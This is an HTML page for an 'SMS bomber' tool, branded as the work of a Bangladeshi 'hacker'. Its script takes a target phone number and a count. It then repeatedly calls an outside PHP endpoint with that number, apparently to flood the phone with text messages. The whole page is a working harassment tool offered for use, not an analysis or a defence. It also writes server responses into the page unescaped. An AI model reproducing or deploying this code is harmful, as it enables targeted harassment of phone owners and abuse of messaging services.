<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HRIDOY SMS BOMBER </title>
    <style>
        body {
            margin: 0;
            font-family: 'Arial', sans-serif;
            background-image: url('https://firebasestorage.googleapis.com/v0/b/gaming-hub-e9709.appspot.com/o/image_url%2F1000038128.jpg?alt=media&token=6d1edeaa-98aa-49ed-8ea7-0c10f0a1978e');
            background-size: cover;
            background-position: center;
            color: #ffffff;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .container {
            background: rgba(0, 0, 0, 0.7);
            padding: 20px 30px;
            border-radius: 15px;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
            width: 80%;
            max-width: 500px;
            animation: slideUp 1s ease-out;
        }
        @keyframes slideUp {
            from {
                transform: translateY(100%);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }
        h1 {
            font-family: 'Pacifico', cursive;
            font-size: 2.5em;
            color: #39ff14;
            text-shadow: 0 0 10px #39ff14, 0 0 20px #39ff14, 0 0 30px #39ff14;
            margin-bottom: 15px;
            letter-spacing: 2px;
        }
        .profile-image {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            margin: 0 auto 15px;
            background-image: url('https://firebasestorage.googleapis.com/v0/b/gaming-hub-e9709.appspot.com/o/image_url%2F1000038128.jpg?alt=media&token=6d1edeaa-98aa-49ed-8ea7-0c10f0a1978e?alt=media&token=6d1edeaa-98aa-49ed-8ea7-0c10f0a1978e');
            background-size: cover;
            background-position: center;
        }
        .container input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #00c6ff;
            border-radius: 25px;
            font-size: 16px;
            outline: none;
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            box-shadow: 0 0 10px #00c6ff, 0 0 20px #00c6ff;
            text-align: center;
        }
        .container input::placeholder {
            color: #cccccc;
            text-shadow: 0 0 10px #00c6ff, 0 0 15px #00c6ff;
        }
        .container input:focus {
            box-shadow: 0 0 15px #00c6ff, 0 0 25px #00c6ff;
            border-color: #00c6ff;
        }
        button {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            background: linear-gradient(90deg, #ff0000, #ff7373);
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: bold;
            color: #ffffff;
            cursor: pointer;
            box-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px #ff4d4d, 0 0 30px #ff4d4d, 0 0 40px #ff4d4d;
        }
        .container .message {
            margin-top: 15px;
            font-size: 16px;
            font-weight: bold;
            color: #00c6ff;
            text-shadow: 0 0 10px #00c6ff, 0 0 15px #00c6ff;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="profile-image"></div>
        <h1>BANGLADESH CYBER SECURITY HACKER HRIDOY </h1>
        <form id="smsForm">
            <input type="text" id="phone" placeholder="Enter phone number" required>
            <input type="number" id="amount" placeholder="Enter amount" required>
            <button type="submit">Submit</button>
        </form>
        <div id="response" class="message"></div>
    </div>
    <script>
        document.getElementById('smsForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            const phone = document.getElementById('phone').value;
            const amount = parseInt(document.getElementById('amount').value);
            const responseDiv = document.getElementById('response');

            if (!phone || !amount || amount <= 0) {
                responseDiv.textContent = "Please enter a valid phone number and amount.";
                return;
            }

            responseDiv.innerHTML = ""; // Clear previous responses

            for (let i = 0; i < amount; i++) {
                try {
                    const response = await fetch(`https://hadivai-mahirvai.my.id/kupasamsu.php?phone=${phone}`);
                    const text = await response.text();
                    responseDiv.innerHTML += `<div>Response ${i + 1}: ${text}</div>`;
                } catch (error) {
                    responseDiv.innerHTML += `<div>Response ${i + 1}: Failed</div>`;
                }
            }
        });
    </script>
</body>
</html>
